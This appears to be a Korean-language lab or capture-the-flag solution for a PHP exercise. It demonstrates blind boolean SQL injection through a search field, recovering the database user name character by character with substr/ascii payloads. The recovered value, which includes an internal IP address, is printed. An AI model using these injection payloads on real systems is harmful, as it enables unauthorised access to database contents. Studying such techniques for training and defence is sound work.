@@ -1,0 +1,145 @@
+PHP 문제 4번
+
+유저명 
+
+select user
+
+
+검색어 
+참 : a%' and '1%'='1 
+거짓 : a%' and '1%'='2
+
+공격 쿼리: a%' and (공격쿼리) and '1%' = '1
+
+a%' and ( ) and '1%' = '1
+
+1. 공격에 사용한 퀴리문
+
+  1)유저명 길이 19글자
+
+select length(user) > 0
+
+a%' and (select length(user()) = 19) and '1%' = '1
+
+  2) 유저명을 한 글자씩
+
+--1번째 글자--
+ a%' and (select ascii (substr(user(), 1,1)) ) = 105   and '1%' = '1
+
+chr(105) -> i
+
+--2번째 글자--
+a%' and (select ascii (substr(user(), 2,1)) ) = 110   and '1%' = '1
+
+chr(110) -> n
+
+--3번째 글자--
+a%' and (select ascii (substr(user(), 3,1)) ) = 102   and '1%' = '1
+
+chr(102) -> f
+
+--4번째 글자--
+
+a%' and (select ascii (substr(user(), 4,1)) ) = 111   and '1%' = '1
+
+chr(111) -> o
+
+--5번째 글자--
+
+a%' and (select ascii (substr(user(), 5,1)) ) = 115   and '1%' = '1
+
+chr(115) -> s
+
+
+--6번째 글자--
+
+a%' and (select ascii (substr(user(), 6,1)) ) = 64   and '1%' = '1
+
+chr(64) -> @
+
+--7번째 글자--
+
+a%' and (select ascii (substr(user(), 7,1)) ) = 49   and '1%' = '1
+
+chr(49) -> 1
+
+--8번째 글자--
+
+a%' and (select ascii (substr(user(), 8,1)) ) = 48   and '1%' = '1
+
+chr(48) -> 0
+
+--9번째 글자--
+
+a%' and (select ascii (substr(user(), 9,1)) ) = 46   and '1%' = '1
+
+chr(46) -> .
+
+--10번째 글자--
+
+a%' and (select ascii (substr(user(), 10,1)) ) = 50   and '1%' = '1
+
+chr(50) -> 2
+
+--11번째 글자--
+
+a%' and (select ascii (substr(user(), 11,1)) ) = 51   and '1%' = '1
+
+chr(51) -> 3
+
+--12번째 글자--
+
+a%' and (select ascii (substr(user(), 12,1)) ) = 51   and '1%' = '1
+
+chr(51) -> 3
+
+--13번째 글자--
+
+a%' and (select ascii (substr(user(), 13,1)) ) = 46   and '1%' = '1
+
+chr(46) -> .
+
+--14번째 글자--
+
+a%' and (select ascii (substr(user(), 14,1)) ) = 55   and '1%' = '1
+
+chr(55) -> 7
+
+--15번째 글자--
+
+a%' and (select ascii (substr(user(), 15,1)) ) = 53   and '1%' = '1
+
+chr(53) -> 5
+
+--16번째 글자--
+
+a%' and (select ascii (substr(user(), 16,1)) ) = 46   and '1%' = '1
+
+chr(46) -> .
+
+--17번째 글자--
+
+a%' and (select ascii (substr(user(), 17,1)) ) = 49   and '1%' = '1
+
+chr(49) -> 1
+
+--18번째 글자--
+
+a%' and (select ascii (substr(user(), 18,1)) ) = 54   and '1%' = '1
+
+chr(54) -> 6
+
+--19번째 글자--
+
+a%' and (select ascii (substr(user(), 19,1)) ) = 48   and '1%' = '1
+
+chr(48) -> 0
+
+2. 정답
+
+infos
+
+
+
+
+
